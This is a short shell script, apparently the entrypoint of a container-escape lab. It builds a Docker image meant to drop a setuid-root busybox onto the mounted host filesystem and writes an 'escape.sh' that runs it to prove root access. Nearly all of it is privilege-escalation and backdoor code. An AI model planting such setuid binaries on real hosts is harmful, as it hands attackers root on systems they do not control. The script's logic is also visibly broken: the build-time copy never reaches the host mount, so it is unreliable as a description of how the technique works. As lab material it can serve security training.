#!/bin/sh
set -e

# Start Docker daemon using the correct path supplied by the base image
/usr/local/bin/dockerd-entrypoint.sh &

# Wait for daemon to be ready
while ! docker info > /dev/null 2>&1; do
  sleep 1
done

# Install a setuid binary (busybox) inside the host filesystem via the mounted Docker socket
# This mimics the vulnerable condition where a privileged container can drop a setuid binary onto the host

# Pull a minimal image that contains busybox
docker pull busybox:latest

# Create a temporary Dockerfile that copies busybox onto the host root with setuid bit
cat > /tmp/Dockerfile <<'EOF'
FROM busybox
COPY --from=busybox /bin/busybox /hostroot/busybox
RUN chmod u+s /hostroot/busybox
EOF

# Build the helper image
docker build -t helper-setuid -f /tmp/Dockerfile /tmp

# Run the helper container mounting the host root filesystem
docker run --rm -v /:/hostroot helper-setuid

# Provide a simple script to demonstrate privilege escalation
cat > /hostroot/escape.sh <<'EOS'
#!/bin/sh
# This script runs the setuid busybox which now executes as root on the host
/hostroot/busybox sh -c 'id > /hostroot/rooted.txt && echo "rooted"'
EOS
chmod +x /hostroot/escape.sh

# Keep the container alive for testing
while true; do
  sleep 3600
done